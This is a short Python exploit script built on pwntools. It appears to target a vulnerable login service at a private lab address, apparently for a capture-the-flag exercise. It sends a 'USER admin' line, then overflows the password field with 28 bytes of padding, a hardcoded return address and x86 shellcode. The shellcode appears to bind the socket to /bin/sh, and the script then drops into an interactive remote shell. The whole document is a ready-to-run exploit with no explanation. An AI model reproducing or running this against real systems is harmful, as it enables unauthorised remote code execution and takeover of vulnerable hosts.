#!/usr/bin/python

import struct
import sys
from pwn import *
from colorama import *


shellcode = (
"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\xcd\x80")

padding="A"*28
eip = struct.pack("I",0xffffd630)
payload=padding+eip+shellcode

host = '10.10.10.34'
port = '7411'

r = remote(host, int(port))
r.sendline("USER admin\n")
r.sendline("PASS " + payload + "\n")
r.interactive()

